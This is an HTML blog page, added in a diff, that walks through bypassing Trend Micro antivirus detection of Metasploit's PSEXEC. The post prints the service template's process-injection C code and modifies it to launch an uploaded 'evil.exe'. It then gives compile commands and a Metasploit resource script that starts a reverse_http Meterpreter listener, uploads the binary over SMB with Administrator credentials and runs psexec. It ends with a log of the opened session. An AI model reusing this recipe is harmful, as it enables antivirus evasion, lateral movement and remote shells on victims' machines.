@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="">
+  <meta name="generator" content="Hugo 0.14" />
+
+  <title>
+
+<body>
+<div id="layout">
+
+  
+<a href="#menu" id="menuLink" class="menu-link">
+  
+  <span></span>
+</a>
+<div id="menu">
+
+  
+
+  <div class="pure-menu">
+    <ul class="pure-menu-list">
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/"><i class='fa fa-home fa-fw'></i>Home</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/post/"><i class='fa fa-list fa-fw'></i>Posts</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/about/"><i class='fa fa-user fa-fw'></i>About</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/contact/"><i class='fa fa-phone fa-fw'></i>Contact</a>
+      
+        </li>
+      
+    </ul>
+  </div>
+
+  <div class="pure-menu social">
+  <ul class="pure-menu-list">
+
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="http://localhost:1313/index.xml"><i class="fa fa-rss fa-fw"></i>RSS</a>
+    </li>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+  </ul>
+</div>
+
+  <div class="pure-g">
+  <div class="small-print pure-u-1 pure-u-md-1-1">
+    <small>&copy; 2016. All rights reserved.</small>
+  </div>
+  <div class="small-print pure-u-1 pure-u-md-1-1">
+    <small>Built with&nbsp;<a href="https://gohugo.io/" target="_blank">Hugo</a></small>
+    <small>Theme&nbsp;<a href="https://github.com/yoshiharuyamashita/blackburn" target="_blank">Blackburn</a></small>
+  </div>
+</div>
+
+</div>
+
+
+  <div id="main">
+
+
+<div class="header">
+  <h1>Bypassing Trend Micro&#39;s Service Protection</h1>
+  <h2></h2>
+</div>
+<div class="content">
+  <p><a href="http://twitter.com/jabjorkhaug">@jabjorkhaug</a> posed the following question on Twitter today:</p>
+
+<p><img src="http://mubix.files.wordpress.com/2012/07/screen20shot202012-07-0420at203-55-0820pm.png.08%20PM.png" alt="Screen Shot 2012 07 04 at 3 55 08 PM" /></p>
+
+<p>I figured I could solve this and it would be an interesting challenge. Here is what it gets detected as:</p>
+
+<p><img src="http://mubix.files.wordpress.com/2012/07/screen20shot202012-07-0420at204-03-1420pm.png.14%20PM.png" alt="Screen Shot 2012 07 04 at 4 03 14 PM" /></p>
+
+<p>The service binary that is used as part of PSEXEC is located here:</p>
+
+<p>MSF Directory/data/templates/src/pe/exe/service/service.c</p>
+
+<p>The important part to look at starts at line 57:</p>
+
+<p>if( CreateProcess( NULL, &ldquo;rundll32.exe&rdquo;, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &amp;si, &amp;pi ) )</p>
+
+<p>{</p>
+
+<p>Context.ContextFlags = CONTEXT_FULL;</p>
+
+<p> </p>
+
+<p>GetThreadContext( pi.hThread, &amp;Context );</p>
+
+<p> </p>
+
+<p>lpPayload = VirtualAllocEx( pi.hProcess, NULL, PAYLOAD_SIZE, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE );</p>
+
+<p>if( lpPayload )</p>
+
+<p>{</p>
+
+<p>WriteProcessMemory( pi.hProcess, lpPayload, &amp;bPayload, PAYLOAD_SIZE, NULL );</p>
+
+<p>#ifdef _WIN64</p>
+
+<p>Context.Rip = (DWORD64)lpPayload;</p>
+
+<p>#else</p>
+
+<p>Context.Eip = (DWORD)lpPayload;</p>
+
+<p>#endif</p>
+
+<p>SetThreadContext( pi.hThread, &amp;Context );</p>
+
+<p>}</p>
+
+<p> </p>
+
+<p>ResumeThread( pi.hThread );</p>
+
+<p> </p>
+
+<p>CloseHandle( pi.hThread );</p>
+
+<p> </p>
+
+<p>CloseHandle( pi.hProcess );</p>
+
+<p>}</p>
+
+<p>It&rsquo;s injecting our payload into the service binary and tossing our payload into &ldquo;rundll32.exe&rdquo; at run time on the victim (side note: you can change which bin it goes into ;). Lets change this so it doesn&rsquo;t do any injection and just executes a binary. That removes the &lsquo;injection&rsquo; piece and hopefully lets us get our shell. We are loosing a bit of stealth because instead of just one (the service binary) we are writing two binaries.</p>
+
+<p>To make this change you replace the above with just this:</p>
+
+<p>if( CreateProcess( NULL, &ldquo;C:\evil.exe&rdquo;, NULL, NULL, FALSE, DETACHED_PROCESS, NULL, NULL, &amp;si, &amp;pi ) )</p>
+
+<p>{</p>
+
+<p> </p>
+
+<p>CloseHandle( pi.hProcess );</p>
+
+<p>}</p>
+
+<p> </p>
+
+<p>Compiling this on OSX using mingw is very easy and is very similar on Ubuntu if you have mingw installed:</p>
+
+<blockquote>
+<p>i386-mingw32-gcc -o service.exe service.c </p>
+</blockquote>
+
+<p>Then just copy it to replace the current one:</p>
+
+<blockquote>
+<p>cp service.exe ../../../../template_x86_windows_svc.exe </p>
+</blockquote>
+
+<p>No other changes are needed. Only problem is, how do we get the &ldquo;evil.exe&rdquo; up onto the box for it to execute? That&rsquo;s where the auxiliary module &ldquo;auxiliary/admin/smb/upload<em>file&rdquo; comes in :-) I built a resource file to demo the timeline of getting execution with this new service binary (broken up with comments to explain, _remove the comments for it to work</em>):</p>
+
+<p>#Start Multi Handler</p>
+
+<pre><code>use multi/handler&lt;br&gt;&lt;/br&gt;set PAYLOAD windows/meterpreter/reverse_http&lt;br&gt;&lt;/br&gt;set LHOST 172.16.195.1&lt;br&gt;&lt;/br&gt;set LPORT 80&lt;br&gt;&lt;/br&gt;set ExitOnSession false&lt;br&gt;&lt;/br&gt;exploit -j -z
+</code></pre>
+
+<p>#Upload file to evil.exe on the C$ share (C$ is default for this module so no reason to set it)</p>
+
+<pre><code>use auxiliary/admin/smb/upload_file&lt;br&gt;&lt;/br&gt;set LPATH evil.exe&lt;br&gt;&lt;/br&gt;set RPATH evil.exe&lt;br&gt;&lt;/br&gt;set RHOST 172.16.195.155&lt;br&gt;&lt;/br&gt;set SMBUser Administrator&lt;br&gt;&lt;/br&gt;set SMBPass Password1234!&lt;br&gt;&lt;/br&gt;run
+</code></pre>
+
+<p>#Execute PSEXEC using the new service binary that simply executes</p>
+
+<pre><code>use exploit/windows/smb/psexec&lt;br&gt;&lt;/br&gt;set RHOST 172.16.195.155&lt;br&gt;&lt;/br&gt;set SMBUser Administrator&lt;br&gt;&lt;/br&gt;set SMBPass Password1234!&lt;br&gt;&lt;/br&gt;set DisablePayloadHandler true&lt;br&gt;&lt;/br&gt;set PAYLOAD windows/meterpreter/reverse_http&lt;br&gt;&lt;/br&gt;set LHOST 172.16.195.1&lt;br&gt;&lt;/br&gt;set LPORT 80&lt;br&gt;&lt;/br&gt;exploit -j -z
+</code></pre>
+
+<p>The passwords could have just as easily been hashes, and the end result is:</p>
+
+<p>Well I can&rsquo;t really show you that nothing was detected… so I guess you just have to believe me when I say:</p>
+
+<pre><code>[*] Meterpreter session 2 opened (172.16.195.1:80 -&gt; 172.16.195.155:49169) at Wed Jul 04 16:02:23 -0400 2012
+</code></pre>
+
+<p>w00t!</p>
+
+</div>
+
+</div>
+</div>
+<script src="http://localhost:1313/js/ui.js"></script>
+
+
+
+
+</body>
+</html>
+
